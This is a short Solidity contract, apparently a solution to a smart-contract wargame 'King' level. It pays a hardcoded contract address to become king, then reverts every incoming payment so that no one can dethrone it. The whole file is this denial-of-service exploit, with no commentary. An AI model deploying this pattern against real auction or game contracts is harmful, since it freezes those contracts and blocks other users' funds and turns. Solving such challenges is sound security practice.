// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TheKingIsDead {
    address kingContract = address(0x3F384a5D306dE92dcC7A3C5d28E2A0647B823962);

    constructor() payable {}

    function becomeKing() public {
        (bool success, ) = payable(kingContract).call{
            value: 2000000000000000,
            gas: 21000000000000
        }("");
        require(success, "Failed to becomeKing()");
    }

    receive() external payable {
        revert("Long live the King.");
    }
}
